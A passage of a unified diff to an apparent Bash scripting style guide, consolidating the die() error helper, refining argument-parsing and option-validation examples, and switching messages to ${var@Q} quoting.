@@ -135,7 +135,7 @@ warn() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
 #debug() { ((DEBUG)) || return 0; >&2 _msg "$@"; }
 success() { ((VERBOSE)) || return 0; >&2 _msg "$@" || return 0; }
 error() { >&2 _msg "$@"; }
-die() { (($# > 1)) && error "${@:2}" ||:; exit "${1:-0}"; }
+die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
 # Yes/no prompt
 yn() {
   #((PROMPT)) || return 0
@@ -665,7 +665,7 @@ process_files() {
 }
 
 # Utilities defined after business logic
-die() { (($# > 1)) && error "${@:2}" ||:; exit "${1:-0}"; }
+die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
 
 main() {
   process_files
@@ -685,7 +685,7 @@ main "$@"
 set -euo pipefail
 
 # Utilities first
-die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }
+die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
 
 # Business logic can safely call utilities
 process_files() {
@@ -938,7 +938,7 @@ main "$@"
 
 set -euo pipefail  # Modifies caller's shell!
 
-die() { (($# > 1)) && error "${@:2}" ||:; exit "${1:-0}"; }
+die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
 
 # Runs automatically when sourced!
 main "$@"
@@ -955,7 +955,7 @@ main "$@"
 
 error() { >&2 echo "ERROR: $*"; }
 
-die() { (($# > 1)) && error "${@:2}" ||:; exit "${1:-0}"; }
+die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
 
 # Only run main when executed (not sourced)
 # Fast exit if sourced
@@ -1515,7 +1515,7 @@ success() { ((VERBOSE)) || return 0; >&2 _msg "$@" || return 0; }
 # Error output (unconditional)
 error() { >&2 _msg "$@"; }
 # Exit with error
-die() { (($# > 1)) && error "${@:2}" ||:; exit "${1:-0}"; }
+die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
 # Yes/no prompt
 yn() {
   #((PROMPT)) || return 0
@@ -1533,7 +1533,7 @@ info() { >&2 echo "${FUNCNAME[0]}: $*"; }
 debug() { >&2 echo "${FUNCNAME[0]}: $*"; }
 success() { >&2 echo "${FUNCNAME[0]}: $*"; }
 error() { >&2 echo "${FUNCNAME[0]}: $*"; }
-die() { (($# > 1)) && error "${@:2}" ||:; exit "${1:-0}"; }
+die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
 ```
 
 User is strongly encouraged to use these function names for logging output, for both consistency, and for when that quick-and-dirty test script of yours evolves into a Magnum Opus, and now you need proper coloured and verbosity controlled message functions, like you should have used straight from the beginning. You're welcome.
@@ -2093,12 +2093,7 @@ SCRIPT_NAME=${SCRIPT_PATH##*/}
 # Then SCRIPT_NAME=deploy.sh
 
 # Use in error messages
-die() {
-  local -i exit_code=$1
-  shift
-  >&2 echo "$SCRIPT_NAME: error: $*"
-  exit "$exit_code"
-}
+die() { (($# < 2)) || >&2 echo "$SCRIPT_NAME: error: ${*:2}"; exit "${1:-0}"; }
 
 # Use in help text
 show_help() {
@@ -2328,12 +2323,7 @@ error() {
   >&2 echo "[$SCRIPT_NAME] ERROR: $*" | tee -a "$LOG_FILE"
 }
 
-die() {
-  local -i exit_code=$1
-  shift
-  error "$*"
-  exit "$exit_code"
-}
+die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
 
 # Show version
 show_version() {
@@ -3188,7 +3178,7 @@ success() { >&2 _msg "$@"; }
 warn() { >&2 _msg "$@"; }
 info() { >&2 _msg "$@"; }
 error() { >&2 _msg "$@"; }
-die() { (($# > 1)) && error "${@:2}" ||:; exit "${1:-0}"; }
+die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
 
 # 2. Documentation functions (no dependencies)
 show_help() { ... }
@@ -3338,19 +3328,14 @@ info() {
 }
 
 warn() {
-  >&2 _msg "WARNING: $*"
+  >&2 _msg "warning: $*"
 }
 
 error() {
-  >&2 _msg "ERROR: $*"
+  >&2 _msg "error: $*"
 }
 
-die() {
-  local -i exit_code=$1
-  shift
-  (($#)) && error "$@"
-  exit "$exit_code"
-}
+die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
 
 success() {
   >&2 _msg "SUCCESS: $*"
@@ -5576,12 +5561,7 @@ error() { >&2 _msg "$@"; }
 success() { >&2 _msg "$@"; }
 debug() { ((VERBOSE >= 2)) || return 0; >&2 _msg "$@"; }
 
-die() {
-  local -i exit_code=${1:-1}
-  shift
-  (($#)) && error "$@" ||:
-  exit "$exit_code"
-}
+die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
 
 # ============================================================================
 # Helper Functions
@@ -7291,7 +7271,7 @@ _msg() {
 
 info() { >&2 _msg "$@"; }
 error() { >&2 _msg "$@"; }
-die() { (($# > 1)) && error "${@:2}" ||:; exit "${1:-0}"; }
+die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
 
 # ============================================================================
 # Documentation Functions
@@ -8703,12 +8683,7 @@ warn() { >&2 _msg "$@"; }
 error() { >&2 _msg "$@"; }
 success() { >&2 _msg "$@"; }
 
-die() {
-  local -i exit_code=${1:-1}
-  shift
-  (($#)) && error "$@"
-  exit "$exit_code"
-}
+die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
 
 # ============================================================================
 # Documentation Functions
@@ -10440,10 +10415,7 @@ warn() { >&2 _msg "$@"; }
 error() { >&2 _msg "$@"; }
 success() { >&2 _msg "$@"; }
 
-die() {
-  (($# > 2)) && error "${@:2}" ||:
-  exit "${1:-1}"
-}
+die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
 
 # ============================================================================
 # Helper Functions
@@ -12082,7 +12054,7 @@ fi
 
 **Standard implementation:**
 ```bash
-die() { (($# > 1)) && error "${@:2}" ||:; exit "${1:-0}"; }
+die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
 die 0                    # Success (or use `exit 0`)
 die 1                    # Exit 1 with no error message
 die 1 'General error'    # General error
@@ -12675,18 +12647,9 @@ declare -r SCRIPT_PATH=$(realpath -- "$0")
 declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
 
 # Messaging functions
-error() {
-  >&2 echo "$SCRIPT_NAME: error: $*"
-}
-
-die() {
-  (($# > 1)) && error "${@:2}" ||:
-  exit "${1:-0}"
-}
-
-info() {
-  echo "$SCRIPT_NAME: $*"
-}
+error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
+die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
+info() { echo "$SCRIPT_NAME: $*"; }
 
 # Validate prerequisites
 check_prerequisites() {
@@ -15614,28 +15577,28 @@ This section establishes the standard argument parsing pattern that supports bot
 
 **Complete pattern with short option support:**
 
-\`\`\`bash
+```bash
 while (($#)); do case $1 in
+  -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
+  -h|--help)      show_help; exit 0 ;;
+
   -a|--add)       noarg "$@"; shift
                   process_argument "$1" ;;
   -m|--depth)     noarg "$@"; shift
-                  max_depth="$1" ;;
+                  max_depth=$1 ;;
   -L|--follow-symbolic)
                   symbolic='-L' ;;
 
-  -p|--prompt)    PROMPT=1; VERBOSE=1 ;;
+  -p|--prompt)    PROMPT=1; ((VERBOSE)) || VERBOSE=1 ;;
   -v|--verbose)   VERBOSE+=1 ;;
-
   -q|--quiet)     VERBOSE=0 ;;
-  -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
 
-  -h|--help)      show_help; exit 0 ;;
-  -[amLpvqVh]*) #shellcheck disable=SC2046 #split up single options
-                  set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}" ;;
-  -*)             die 22 "Invalid option '$1'" ;;
+  -[VhamLpvq]*) #shellcheck disable=SC2046 #split up single options
+                  set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}" ;;
+  -*)             die 22 "Invalid option ${1@Q}" ;;
   *)              Paths+=("$1") ;;
 esac; shift; done
-\`\`\`
+```
 
 **Pattern breakdown and rationale:**
 
@@ -15650,38 +15613,41 @@ esac; shift; done
 - More readable than nested if/elif chains
 
 **3. Options with arguments:**
-\`\`\`bash
+```bash
 -m|--depth)     noarg "$@"; shift
-                max_depth="$1" ;;
-\`\`\`
+                max_depth=$1 ;;
+```
 - `noarg "$@"` - Validates argument exists (prevents "missing argument" errors)
 - `shift` - Moves to next argument (the value)
 - `max_depth="$1"` - Captures the value
 - Second `shift` at end of loop moves past the value
 
 **4. Options without arguments (flags):**
-\`\`\`bash
--p|--prompt)    PROMPT=1; VERBOSE=1 ;;
+```bash
+-p|--prompt)    PROMPT=1; ((VERBOSE)) || VERBOSE=1 ;;
 -v|--verbose)   VERBOSE+=1 ;;
-\`\`\`
+```
 - Just set variables, no shift needed (handled at loop end)
 - Can set multiple variables per option
 - `VERBOSE+=1` allows stacking: `-vvv` = `VERBOSE=3`
 
 **5. Options that exit immediately:**
-\`\`\`bash
+```bash
 -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
 -h|--help)      show_help; exit 0 ;;
-\`\`\`
+```
 - Print information and exit
 - No shift needed (script exits)
 - Use `exit 0` (success exit code)
+- If within a function, use `return 0`
 
 **6. Short option bundling:**
-\`\`\`bash
--[amLpvqVh]*) #shellcheck disable=SC2046 #split up single options
-              set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}" ;;
-\`\`\`
+In command argument processing loops, short option splitting should *always* be included.
+
+```bash
+-[VhamLpvq]*) #shellcheck disable=SC2046 #split up single options
+              set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}" ;;
+```
 - **Purpose**: Allows `-vpL` instead of `-v -p -L`
 - **Pattern**: `-[amLpvqVh]*` matches any short option combination
 - **Mechanism**: Splits bundled options into separate arguments
@@ -15693,36 +15659,34 @@ esac; shift; done
   4. `set --` - Replace argument list with expanded options
 
 **7. Invalid option handling:**
-\`\`\`bash
--*)             die 22 "Invalid option '$1'" ;;
-\`\`\`
+```bash
+-*)             die 22 "Invalid option ${1@Q}" ;;
+```
 - Catches any unrecognized option starting with `-`
 - Uses exit code 22 (EINVAL - invalid argument)
 - Shows which option was invalid
 
 **8. Positional arguments:**
-\`\`\`bash
+```bash
 *)              Paths+=("$1") ;;
-\`\`\`
+```
 - Default case: Not an option, must be positional argument
 - Append to array for later processing
 - Allows unlimited positional arguments
 
 **9. Mandatory shift at end:**
-\`\`\`bash
+```bash
 esac; shift; done
-\`\`\`
+```
 - `shift` after every iteration moves to next argument
 - Critical: Without this, infinite loop!
 - Placed after `esac` to handle all branches uniformly
 
 **The `noarg` helper function:**
 
-\`\`\`bash
-noarg() {
-  (($# > 1)) || die 2 "Option '$1' requires an argument"
-}
-\`\`\`
+```bash
+noarg() { (($# > 1)) || die 2 "Option ${1@Q} requires an argument"; }
+```
 
 - **Purpose**: Validates that option requiring an argument has one
 - **Check**: `(($# > 1))` - At least 2 args (option + value)
@@ -15731,12 +15695,12 @@ noarg() {
 
 **Complete example with all features:**
 
-\`\`\`bash
+```bash
 #!/usr/bin/env bash
 set -euo pipefail
 shopt -s inherit_errexit shift_verbose extglob nullglob
 
-declare -r VERSION='1.0.0'
+declare -r VERSION=1.0.0
 #shellcheck disable=SC2155
 declare -r SCRIPT_PATH=$(realpath -- "$0")
 declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
@@ -15751,20 +15715,9 @@ declare -a files=()
 # Utility Functions
 # ============================================================================
 
-error() {
-  >&2 echo "[$SCRIPT_NAME] ERROR: $*"
-}
-
-die() {
-  local -i exit_code=$1
-  shift
-  (($#)) && error "$@"
-  exit "$exit_code"
-}
-
-noarg() {
-  (($# > 1)) || die 2 "Option '$1' requires an argument"
-}
+error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
+die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
+noarg() { (($# > 1)) || die 2 "Option ${1@Q} requires an argument"; }
 
 show_help() {
   cat <<EOF
@@ -15802,7 +15755,7 @@ main() {
     # Short option bundling support
     -[ovnVh]*)    #shellcheck disable=SC2046
                     set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}" ;;
-    -*)             die 22 "Invalid option '$1'" ;;
+    -*)             die 22 "Invalid option ${1@Q}" ;;
     *)              files+=("$1") ;;
   esac; shift; done
 
@@ -15815,27 +15768,27 @@ main() {
   [[ -n "$output_file" ]] || die 2 'Output file required (use -o)'
 
   # Use parsed arguments
-  ((VERBOSE)) && echo "Processing ${#files[@]} files"
-  ((DRY_RUN)) && echo '[DRY RUN] Would write to:' "$output_file"
+  ((VERBOSE)) && echo "Processing ${#files[@]} files" ||:
+  ((DRY_RUN)) && echo '[DRY RUN] Would write to:' "$output_file" ||:
 
   # Process files (example logic)
   local -- file
   for file in "${files[@]}"; do
-    ((VERBOSE)) && echo "Processing: $file"
+    ((VERBOSE)) && echo "Processing ${file@Q}" ||:
     # Processing logic here
   done
 
-  ((VERBOSE)) && echo "Would write results to: $output_file"
+  ((VERBOSE)) && echo "Would write results to ${output_file@Q}" ||:
 }
 
 main "$@"
 
 #fin
-\`\`\`
+```
 
 **Short option bundling examples:**
 
-\`\`\`bash
+```bash
 # These are equivalent:
 ./script -v -n -o output.txt file.txt
 ./script -vno output.txt file.txt
@@ -15846,11 +15799,11 @@ main "$@"
 
 # Mixed long and short:
 ./script --verbose -no output.txt --dry-run file.txt
-\`\`\`
+```
 
 **Anti-patterns to avoid:**
 
-\`\`\`bash
+```bash
 # ✗ Wrong - using while [[ ]] instead of (())
 while [[ $# -gt 0 ]]; do  # Verbose, less efficient
 
@@ -15889,7 +15842,7 @@ case $1 in
   -h|--help)    show_help; exit 0 ;;
   ...
 esac
-\`\`\`
+```
 
 **Rationale for this pattern:**
 
@@ -15908,11 +15861,11 @@ esac
 
 ## Version Output Format
 
-**Standard format:** \`<script_name> <version_number>\`
+**Standard format:** `<script_name> <version_number>`
 
-The \`--version\` option should output the script name followed by a space and the version number. Do **not** include the word "version" between them.
+The `-V`/`--version` option should output the script name followed by a space and the version number. Do **not** include the words "version", "vs", or "v" between them.
 
-\`\`\`bash
+```bash
 # ✓ Correct
 -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
 # Output: myscript 1.2.3
@@ -15920,9 +15873,9 @@ The \`--version\` option should output the script name followed by a space and t
 # ✗ Wrong - do not include the word "version"
 -V|--version)   echo "$SCRIPT_NAME version $VERSION"; exit 0 ;;
 # Output: myscript version 1.2.3  (incorrect)
-\`\`\`
+```
 
-**Rationale:** This format follows GNU standards and is consistent with most Unix/Linux utilities (e.g., \`bash --version\` outputs "GNU bash, version 5.2.15", not "GNU bash version version 5.2.15").
+**Rationale:** This format follows GNU standards and is consistent with most Unix/Linux utilities (e.g., `bash --version` outputs "GNU bash, version 5.2.15", not "GNU bash version version 5.2.15").
 
 
 ---
@@ -15943,9 +15896,7 @@ The \`--version\` option should output the script name followed by a space and t
 Validates that an option has an argument following it.
 
 ```bash
-noarg() {
-  (($# > 1)) && [[ ${2:0:1} != '-' ]] || die 2 "Missing argument for option '$1'"
-}
+noarg() { (($# > 1)) && [[ ${2:0:1} != '-' ]] || die 2 "Missing argument for option ${1@Q}"; }
 ```
 
 **Usage:**
@@ -15954,7 +15905,7 @@ while (($#)); do case $1 in
   -o|--output)
     noarg "$@"      # Validate argument exists
     shift
-    OUTPUT="$1"     # Now safe to use $1
+    OUTPUT=$1       # Now safe to use $1
     ;;
 esac; shift; done
 ```
@@ -15981,7 +15932,7 @@ while (($#)); do case $1 in
   -p|--prefix)
     arg2 "$@"       # Enhanced validation
     shift
-    PREFIX="$1"
+    PREFIX=$1
     ;;
 esac; shift; done
 ```
@@ -15996,28 +15947,24 @@ esac; shift; done
 - **Prevents:** Using next option as value
 - **Safe quoting:** `${1@Q}` escapes special characters in error output
 
-**3. `arg2_num()` - Numeric Argument Validation**
+**3. `arg_num()` - Numeric Argument Validation**
 
 Validates that an option's argument is a valid integer.
 
 ```bash
-arg2_num() {
-  if ((${#@}-1<1)) || [[ ! "$2" =~ ^[0-9]+$ ]]; then
-    die 2 "${1@Q} requires a numeric argument"
-  fi
-}
+arg_num() { ((${#@}-1<1)) || [[ ! "$2" =~ ^[0-9]+$ ]] && die 2 "${1@Q} requires a numeric argument" ||:; }
 ```
 
 **Usage:**
 ```bash
 while (($#)); do case $1 in
   -d|--depth)
-    arg2_num "$@"   # Validate numeric
+    arg_num "$@"   # Validate numeric
     shift
     MAX_DEPTH="$1"  # Guaranteed to be integer
     ;;
   -C|--context)
-    arg2_num "$@"
+    arg_num "$@"
     shift
     CONTEXT_LINES="$1"
     ;;
@@ -16054,13 +16001,13 @@ main() {
     -o|--output)
       arg2 "$@"                 # String validation
       shift
-      OUTPUT_FILE="$1"
+      OUTPUT_FILE=$1
       ;;
 
     -d|--depth)
-      arg2_num "$@"             # Numeric validation
+      arg_num "$@"              # Numeric validation
       shift
-      MAX_DEPTH="$1"
+      MAX_DEPTH=$1
       ;;
 
     -v|--verbose)
@@ -16070,7 +16017,7 @@ main() {
     -h|--help)
       noarg "$@"                # Basic check (also valid)
       shift
-      HELP_TOPIC="$1"
+      HELP_TOPIC=$1
       ;;
 
     -*)
@@ -16088,21 +16035,11 @@ main() {
 }
 
 # Validation helpers
-arg2() {
-  if ((${#@}-1<1)) || [[ "${2:0:1}" == '-' ]]; then
-    die 2 "${1@Q} requires argument"
-  fi
-}
+arg2() { ((${#@}-1<1)) || [[ "${2:0:1}" == '-' ]] && die 2 "${1@Q} requires argument" ||:; }
 
-arg2_num() {
-  if ((${#@}-1<1)) || [[ ! "$2" =~ ^[0-9]+$ ]]; then
-    die 2 "${1@Q} requires a numeric argument"
-  fi
-}
+arg_num() { ((${#@}-1<1)) || [[ ! "$2" =~ ^[0-9]+$ ]] && die 2 "${1@Q} requires a numeric argument" ||:; }
 
-noarg() {
-  (($# > 1)) && [[ ${2:0:1} != '-' ]] || die 2 "Missing argument for option '$1'"
-}
+noarg() { (($# > 1)) && [[ ${2:0:1} != '-' ]] || die 2 "Missing argument for option ${1@Q}"; }
 
 main "$@"
 ```
@@ -16113,7 +16050,7 @@ main "$@"
 |-----------|----------|----------------|
 | `noarg()` | Simple existence check | `-o FILE`, `-m MSG` |
 | `arg2()` | String args, prevent `-` prefix | `--prefix PATH`, `--output FILE` |
-| `arg2_num()` | Numeric args requiring integers | `--depth NUM`, `--retries COUNT`, `-C NUM` |
+| `arg_num()` | Numeric args requiring integers | `--depth NUM`, `--retries COUNT`, `-C NUM` |
 
 ### Anti-Patterns
 
@@ -16132,12 +16069,12 @@ main "$@"
     die 2 "Option '-p' requires an argument"
   fi
   shift
-  PREFIX="$1"
+  PREFIX=$1
   ;;
 # Problem: Repetitive, verbose, inconsistent error messages
 
 # ✓ Use helpers
--p|--prefix) arg2 "$@"; shift; PREFIX="$1" ;;
+-p|--prefix) arg2 "$@"; shift; PREFIX=$1 ;;
 ```
 
 ### Error Message Quality
@@ -16158,10 +16095,10 @@ These validators work seamlessly with the standard argument parsing pattern (BCS
 
 ```bash
 while (($#)); do case $1 in
-  -d|--depth)     arg2_num "$@"; shift; MAX_DEPTH="$1" ;;
+  -d|--depth)     arg_num "$@"; shift; MAX_DEPTH=$1 ;;
   -v|--verbose)   VERBOSE=1 ;;
   -h|--help)      show_help; exit 0 ;;
-  -[dvh]*)        set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}" ;;
+  -[dvh]*)        set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}" ;;
   -*)             die 22 "Invalid option ${1@Q}" ;;
   *)              FILES+=("$1") ;;
 esac; shift; done
@@ -16177,15 +16114,15 @@ esac; shift; done
 
 ## Argument Parsing Location
 
-**Recommendation:** Place argument parsing inside the \`main()\` function rather than at the top level.
+**Recommendation:** Place argument parsing inside the `main()` function rather than at the top level.
 
 **Benefits:**
-- Better testability (can test \`main()\` with different arguments)
-- Cleaner variable scoping (parsing vars are local to \`main()\`)
+- Better testability (can test `main()` with different arguments)
+- Cleaner variable scoping (parsing vars are local to `main()`)
 - Encapsulation (argument handling is part of main execution flow)
 - Easier to mock/test in unit tests
 
-\`\`\`bash
+```bash
 # Recommended: Parsing inside main()
 main() {
   # Parse command-line arguments
@@ -16197,7 +16134,7 @@ main() {
       --no-builtin) SKIP_BUILTIN=1
                     ;;
       --prefix)     shift
-                    PREFIX="$1"
+                    PREFIX=$1
                     # Update derived paths
                     BIN_DIR="$PREFIX"/bin
                     LOADABLE_DIR="$PREFIX"/lib/bash/loadables
@@ -16205,10 +16142,10 @@ main() {
       -h|--help)    show_help
                     exit 0
                     ;;
-      -*)           die 22 "Invalid option '$1'"
+      -*)           die 22 "Invalid option ${1@Q}"
                     ;;
       *)            >&2 show_help
-                    die 2 "Unknown option '$1'"
+                    die 2 "Unknown option ${1@Q}"
                     ;;
     esac
     shift
@@ -16222,11 +16159,11 @@ main() {
 
 main "$@"
 #fin
-\`\`\`
+```
 
-**Alternative:** For very simple scripts (< 200 lines) without a \`main()\` function, top-level parsing is acceptable:
+**Alternative:** For very simple scripts (< 200 lines) without a `main()` function, top-level parsing is acceptable:
 
-\`\`\`bash
+```bash
 #!/bin/bash
 set -euo pipefail
 
@@ -16234,12 +16171,13 @@ set -euo pipefail
 while (($#)); do case $1 in
   -v|--verbose) VERBOSE=1 ;;
   -h|--help)    show_help; exit 0 ;;
-  -*)           die 22 "Invalid option '$1'" ;;
+  -*)           die 22 "Invalid option ${1@Q}" ;;
   *)            FILES+=("$1") ;;
 esac; shift; done
 
 # Rest of simple script logic
-\`\`\`
+```
+
 
 
 ---
@@ -16281,7 +16219,7 @@ Without disaggregation support, your script would treat `-lha` as a single unkno
 case $1 in
   # ...
   -[amLpvqVh]*) #shellcheck disable=SC2046 #split up aggregated short options
-    set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}"
+    set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}"
     ;;
   # ...
 esac
@@ -16315,7 +16253,7 @@ esac
 case $1 in
   # ...
   -[amLpvqVh]*) #split up aggregated short options
-    set -- '' $(printf -- "-%c " $(fold -w1 <<<"${1:1}")) "${@:2}"
+    set -- '' $(printf -- '-%c ' $(fold -w1 <<<"${1:1}")) "${@:2}"
     ;;
   # ...
 esac
@@ -16419,8 +16357,7 @@ declare -a files=()
 # ============================================================================
 
 error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
-die() { (($#>1)) && error "$@"; exit ${1:-0}; }
-
+die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
 noarg() { (($# > 1)) || die 2 "Option '$1' requires an argument"; }
 
 show_help() {
@@ -16460,8 +16397,8 @@ main() {
 
     # Short option bundling support (grep method)
     -[onvqVh]*) #shellcheck disable=SC2046
-                    set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}" ;;
-    -*)             die 22 "Invalid option '$1'" ;;
+                    set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}" ;;
+    -*)             die 22 "Invalid option ${1@Q}" ;;
     *)              files+=("$1") ;;
   esac; shift; done
 
@@ -16474,17 +16411,17 @@ main() {
   [[ -n "$output_file" ]] || die 2 'Output file required (use -o)'
 
   # Use parsed arguments
-  ((VERBOSE)) && echo "Processing ${#files[@]} files"
-  ((DRY_RUN)) && echo "[DRY RUN] Would write to ${output_file@Q}"
+  ((VERBOSE)) && echo "Processing ${#files[@]} files" ||:
+  ((DRY_RUN)) && echo "[DRY RUN] Would write to ${output_file@Q}" ||:
 
   # Process files
   local -- file
   for file in "${files[@]}"; do
-    ((VERBOSE > 1)) && echo "Processing: $file"
+    ((VERBOSE > 1)) && echo "Processing ${file@Q}"
     # Processing logic here
   done
 
-  ((VERBOSE)) && echo "Results would be written to ${output_file@Q}"
+  ((VERBOSE)) && echo "Results would be written to ${output_file@Q}" ||:
 }
 
 main "$@"
@@ -16515,8 +16452,7 @@ declare -- config_file=''
 # ============================================================================
 
 error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
-die() { (($#>1)) && error "$@"; exit ${1:-0}; }
-
+die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
 noarg() { (($# > 1)) || die 2 "Option ${1@Q} requires an argument"; }
 
 show_help() {
@@ -16541,7 +16477,7 @@ EOF
 main() {
   # Parse arguments
   while (($#)); do case $1 in
-    -c|--config)    (($#>0)) || die 22 "Option '$1' requires argument"
+    -c|--config)    (($#>0)) || die 22 "Option ${1@Q} requires argument"
                     shift
                     config_file=$1 ;;
     -f|--force)     FORCE=1 ;;
@@ -16554,9 +16490,9 @@ main() {
 
     # Short option bundling support (fold method)
     -[cfvqVh]*) #shellcheck disable=SC2046
-                    set -- '' $(printf -- "-%c " $(fold -w1 <<<"${1:1}")) "${@:2}" ;;
-    -*)             die 22 "Invalid option '$1'" ;;
-    *)              die 2 "Unexpected argument '$1'" ;;
+                    set -- '' $(printf -- '-%c ' $(fold -w1 <<<"${1:1}")) "${@:2}" ;;
+    -*)             die 22 "Invalid option ${1@Q}" ;;
+    *)              die 2 "Unexpected argument ${1@Q}" ;;
   esac; shift; done
 
   # Make variables readonly after parsing
@@ -16565,8 +16501,8 @@ main() {
   # Validate required arguments
   [[ -n "$config_file" ]] || die 2 'Configuration file required (use -c)'
 
-  ((VERBOSE)) && echo "Using config ${config_file@Q}"
-  ((FORCE)) && echo '[FORCE MODE] Ignoring safety checks'
+  ((VERBOSE)) && echo "Using config ${config_file@Q}" ||:
+  ((FORCE)) && echo '[FORCE MODE] Ignoring safety checks' ||:
 
   # Main logic here
 }
@@ -16600,7 +16536,7 @@ declare -a targets=()
 # ============================================================================
 
 error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
-die() { (($#>1)) && error "$@"; exit ${1:-0}; }
+die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
 
 noarg() { (($# > 1)) || die 2 "Option '$1' requires an argument"; }
 
@@ -17171,18 +17107,18 @@ This section establishes safe file handling practices to prevent common pitfalls
 
 **Always quote variables and use `[[ ]]` for file tests:**
 
-\`\`\`bash
+```bash
 # Basic file testing
 [[ -f "$file" ]] && source "$file"
-[[ -d "$path" ]] || die 1 "Not a directory: $path"
-[[ -r "$file" ]] || warn "Cannot read: $file"
-[[ -x "$script" ]] || die 1 "Not executable: $script"
+[[ -d "$path" ]] || die 1 "Not a directory ${path@Q}"
+[[ -r "$file" ]] || warn "Cannot read ${file@Q}"
+[[ -x "$script" ]] || die 1 "Not executable ${script@Q}"
 
 # Check multiple conditions
 if [[ -f "$config" && -r "$config" ]]; then
   source "$config"
 else
-  die 3 "Config file not found or not readable: $config"
+  die 3 "Config file not found or not readable ${config@Q}"
 fi
 
 # Check file emptiness
@@ -17193,7 +17129,7 @@ if [[ "$source" -nt "$destination" ]]; then
   cp "$source" "$destination"
   info "Updated $destination"
 fi
-\`\`\`
+```
 
 **Complete file test operators:**
 
@@ -17241,19 +17177,19 @@ fi
 
 **Common patterns:**
 
-\`\`\`bash
+```bash
 # Validate required file exists and is readable
 validate_file() {
   local file=$1
-  [[ -f "$file" ]] || die 2 "File not found: $file"
-  [[ -r "$file" ]] || die 5 "Cannot read file: $file"
+  [[ -f "$file" ]] || die 2 "File not found ${file@Q}"
+  [[ -r "$file" ]] || die 5 "Cannot read file ${file@Q}"
 }
 
 # Check if directory is writable
 ensure_writable_dir() {
   local dir=$1
-  [[ -d "$dir" ]] || mkdir -p "$dir" || die 1 "Cannot create directory: $dir"
-  [[ -w "$dir" ]] || die 5 "Directory not writable: $dir"
+  [[ -d "$dir" ]] || mkdir -p "$dir" || die 1 "Cannot create directory ${dir@Q}"
+  [[ -w "$dir" ]] || die 5 "Directory not writable ${dir@Q}"
 }
 
 # Only process if file was modified
@@ -17265,7 +17201,7 @@ process_if_modified() {
     process_file "$source"
     touch "$marker"
   else
-    info "File $source not modified, skipping"
+    info "File ${source@Q} not modified, skipping"
   fi
 }
 
@@ -17282,19 +17218,19 @@ safe_source() {
     if [[ -r "$file" ]]; then
       source "$file"
     else
-      warn "Cannot read file: $file"
+      warn "Cannot read file ${file@Q}"
       return 1
     fi
   else
-    debug "File not found: $file (optional)"
+    debug "File not found ${file@Q} (optional)"
     return 0
   fi
 }
-\`\`\`
+```
 
 **Anti-patterns to avoid:**
 
-\`\`\`bash
+```bash
 # ✗ Wrong - unquoted variable
 [[ -f $file ]]  # Breaks with spaces or special chars
 
@@ -17315,23 +17251,23 @@ fi
 source "$config"  # Error if file doesn't exist
 
 # ✓ Correct - validate first
-[[ -f "$config" ]] || die 3 "Config not found: $config"
-[[ -r "$config" ]] || die 5 "Cannot read config: $config"
+[[ -f "$config" ]] || die 3 "Config not found ${config@Q}"
+[[ -r "$config" ]] || die 5 "Cannot read config: ${config@Q}"
 source "$config"
 
 # ✗ Wrong - silent failure
 [[ -d "$dir" ]] || mkdir "$dir"  # mkdir failure not caught
 
 # ✓ Correct - check result
-[[ -d "$dir" ]] || mkdir "$dir" || die 1 "Cannot create directory: $dir"
-\`\`\`
+[[ -d "$dir" ]] || mkdir "$dir" || die 1 "Cannot create directory: ${dir@Q}"
+```
 
 **Combining file tests:**
 
-\`\`\`bash
+```bash
 # Multiple conditions with AND
 if [[ -f "$file" && -r "$file" && -s "$file" ]]; then
-  info "Processing non-empty readable file: $file"
+  info "Processing non-empty readable file ${file@Q}"
   process_file "$file"
 fi
 
@@ -17348,12 +17284,13 @@ fi
 validate_executable() {
   local script=$1
 
